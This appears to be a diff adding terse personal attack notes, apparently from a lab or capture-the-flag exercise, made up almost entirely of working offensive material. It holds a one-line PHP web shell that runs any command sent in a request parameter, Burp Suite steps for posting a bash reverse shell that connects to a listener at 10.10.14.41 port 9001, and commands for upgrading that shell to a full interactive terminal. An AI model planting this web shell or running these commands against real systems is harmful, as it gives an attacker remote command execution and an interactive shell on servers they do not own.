@@ -1,0 +1,18 @@
+
+<?php
+system($_REQUEST['cmd']);
+?>
+
+
+In burp:
+Convert to POST
+
+cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.41/9001 0>&1'
+
+select command and hit ctrl+u
+
+Reverse Shell at client:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+ctrl+ Z
+
+stty raw -echo; fg
